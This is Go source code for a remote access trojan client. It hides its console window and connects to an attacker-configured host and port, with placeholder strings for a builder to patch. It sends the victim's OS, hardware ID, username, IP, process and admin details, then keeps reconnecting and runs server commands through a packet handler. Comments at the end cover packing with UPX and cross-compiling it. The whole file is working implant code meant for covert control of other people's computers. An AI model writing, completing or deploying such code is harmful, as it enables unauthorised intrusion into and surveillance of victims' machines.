package main

import (
	"bytes"
	"encoding/binary"
	"main/HandlePacket"
	"main/MessagePack"
	"main/PcInfo"
	"main/TCPsocket"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows/registry"
)

type TCPClient struct {
	Client            *net.TCPConn
	Buffer            []byte
	BufferSize        int64
	MS                bytes.Buffer
	IsConnected       bool
	SendSync          sync.Mutex
	ActivatePong      bool
	RemarkMessage     string
	RemarkClientColor string
	keepAlive         *time.Ticker
	// Implementing timers and ThreadPool would require more context and may need external libraries
}

// assuming for the sake of example

func (s *TCPClient) InitializeClient() {
	addr, err := net.ResolveTCPAddr("tcp", PcInfo.Host+":"+PcInfo.Port)
	if err != nil {
		s.IsConnected = false
		return
	}

	conn, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		s.IsConnected = false
		return
	}

	s.Client = conn
	if s.Client != nil {
		s.IsConnected = true
		s.Buffer = make([]byte, 4)
		s.MS.Reset()

		// Assuming SendInfo() exists
		TCPsocket.Send(s.Client, SendInfo())

		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
		s.keepAlive = time.NewTicker(15 * time.Second)

		// Start a goroutine to handle the ticks
		go func() {
			for range s.keepAlive.C {
				s.KeepAlivePacket(s.Client)
			}
		}()

		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *TCPClient) ReadServerData() {
	if s.Client == nil || !s.IsConnected {
		s.IsConnected = false
		return
	}

	n, err := s.Client.Read(s.Buffer)
	if err != nil {
		s.IsConnected = false
		return
	}

	if n == 4 {
		s.MS.Write(s.Buffer)
		s.BufferSize = int64(binary.LittleEndian.Uint32(s.MS.Bytes()))
		s.MS.Reset()
		if s.BufferSize > 0 {
			s.Buffer = make([]byte, s.BufferSize)
			for int64(s.MS.Len()) != s.BufferSize {
				rc, err := s.Client.Read(s.Buffer)
				if err != nil {
					s.IsConnected = false
					return
				}
				s.MS.Write(s.Buffer[:rc])
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
			if int64(s.MS.Len()) == s.BufferSize {
				//fmt.Println("calc")
				HandlePacket.Read(s.MS.Bytes(), s.Client)
				//time.Sleep(time.Second * 1)

				s.Buffer = make([]byte, 4)
				s.MS.Reset()
			} else {
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
		}
		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}
func checkDotNetFramework40() bool {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()
	release, _, err := key.GetIntegerValue("Release")
	if err != nil {
		return false
	}
	return release >= 378389
}

func (s *TCPClient) KeepAlivePacket(conn net.Conn) {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
	msgpack.ForcePathObject("Message").SetAsString("DDDD")

	TCPsocket.Send(conn, msgpack.Encode2Bytes())
	s.ActivatePong = true
}
func SendInfo() []byte {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")

	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetOSVersion())
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())

	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetUserName())
	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())

	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("SleepTime").SetAsString("10")
	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)

	msgpack.ForcePathObject("Admin").SetAsString(PcInfo.IsAdmin())
	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
	//println(string(msgpack.Encode2Bytes()))
	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
	return msgpack.Encode2Bytes()
}
func (s *TCPClient) Reconnect() {
	s.CloseConnection()
	s.InitializeClient()
}

func (s *TCPClient) CloseConnection() {
	if s.Client != nil {
		s.Client.Close()
	}
	s.MS.Reset()
}

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

var ClientWorking bool

func ShowConsole() {
	ShowConsoleAsync(w32.SW_SHOW)
}

func ShowConsoleAsync(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}
func HideConsole() {
	ShowConsoleAsync(w32.SW_HIDE)
}
func main() {

	Host := "HostAAAABBBBCCCCDDDD"
	Port := "PortAAAABBBBCCCCDDDD"
	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")

	// PcInfo.Host = "192.168.31.81"
	// PcInfo.Port = "4000"
	// PcInfo.ListenerName = "asd"
	HideConsole()
	PcInfo.IsDotNetFour = checkDotNetFramework40()
	ClientWorking = true
	socket := TCPClient{}
	socket.InitializeClient()

	r := rand.New(rand.NewSource(time.Now().UnixNano())) // Create a new random generator

	for ClientWorking {
		if !socket.IsConnected {
			socket.Reconnect()
		}
		time.Sleep(time.Duration(r.Intn(6000)) * time.Millisecond)
	}
}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
